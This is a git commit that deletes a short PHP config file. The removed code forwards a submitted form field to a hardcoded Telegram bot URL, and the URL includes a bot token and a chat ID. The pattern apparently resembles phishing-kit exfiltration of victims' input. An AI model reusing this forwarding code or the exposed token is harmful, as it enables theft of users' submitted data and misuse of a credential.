6dd10c43122d78002e04af7b60e952fed9043060
AI22AK47 <94799989+AI22AK47@users.noreply.github.com>
2022-11-07 07:35:22 +0600

    Delete config.php

--- config.php
+++
@@ -1,7 +0,0 @@
-<?php
-
-$Ip = 'chat_id';
-    if(isset($_POST['submit']))
-    $text=$_POST["$Ip"];
-        $response = file_get_contents("https://api.telegram.org/bot5710412371:AAGXuAdUqd5sP4dp-nGYbZhHy84MShP1p20/sendMessage?chat_id=5148207901&text=$text,$text2");    
-?>
